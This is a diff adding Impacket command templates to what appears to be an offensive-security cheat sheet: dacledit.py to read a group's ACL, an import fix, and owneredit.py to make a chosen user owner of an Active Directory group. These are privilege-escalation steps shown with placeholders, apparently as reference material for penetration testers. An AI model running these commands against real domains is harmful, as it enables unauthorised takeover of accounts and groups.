@@ -2850,6 +2850,29 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 243             target = self.__kdcHost
 ```
 
+##### dacledit.py
+
+> https://github.com/fortra/impacket/blob/204c5b6b73f4d44bce0243a8f345f00e308c9c20/examples/dacledit.py
+
+```c
+$ python3 dacledit.py <DOMAIN>/<USERNAME>:<PASSWORD> -k -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' -dc-ip <RHOST> -action read -principal '<USERNAME>' -target '<GROUP>' -debug
+```
+
+###### Fixing msada_guids Error
+
+```c
+#from impacket.msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
+from msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
+```
+
+##### owneredit.py
+
+> https://github.com/fortra/impacket/blob/5c477e71a60e3cc434ebc0fcc374d6d108f58f41/examples/owneredit.py
+
+```c
+$ python3 owneredit.py -k '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <RHOST> -action write -new-owner '<USERNAME>' -target '<GROUP>' -debug
+```
+
 #### Internet Information Service (IIS)
 
 ##### Application Pool Credential Dumping
